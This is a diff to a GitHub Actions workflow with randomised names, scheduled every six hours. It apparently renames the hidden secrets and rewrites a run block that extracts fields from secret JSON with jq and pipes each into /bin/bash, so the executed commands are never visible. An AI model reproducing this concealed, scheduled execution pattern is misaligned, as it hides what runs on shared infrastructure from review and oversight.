@@ -1,9 +1,8 @@
 name: haoshangshu2391
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 2/6 * * *'
+    - cron: '10 5/6 * * *'
 
 jobs:
   build:
@@ -12,17 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: haoshangshu2391
         env:
-          hoo373: ${{ secrets.hoo373 }}
+          zzkcs63609: ${{ secrets.zzkcs63609 }}
         run: |
-          echo $hoo373 | jq -r .kmyo36 | /bin/bash
-          echo $u380 | jq -r .esmh85669 | /bin/bash
-          echo $icrx85 | jq -r .urblf7 | /bin/bash
-          echo $mrd6 | jq -r .ekujn13201 | /bin/bash
-          echo $ye7 | jq -r .a561 | /bin/bash
-          echo $b423 | jq -r .irgn8 | /bin/bash
-          echo $migi2 | jq -r .qmmly4772 | /bin/bash
-          echo $wvd7 | jq -r .qd54 | /bin/bash
-          echo $pnkxt4 | jq -r .y57791 | /bin/bash
-          echo $oyp1408 | jq -r .rnt274 | /bin/bash
-          echo $atdh82 | jq -r .fmjb5916 | /bin/bash
+          echo $zzkcs63609 | jq -r .ocokz8954 | /bin/bash
+          echo $iyqh6 | jq -r .sd8742 | /bin/bash
+          echo $aglb7713 | jq -r .zillm9152 | /bin/bash
+          echo $qtm40 | jq -r .cvt2 | /bin/bash
+          echo $koo34 | jq -r .j941 | /bin/bash
+          echo $wbuqt912 | jq -r .uadq1337 | /bin/bash
+          echo $mky708 | jq -r .aa21 | /bin/bash
+          echo $q44947 | jq -r .bkvjv3 | /bin/bash
 
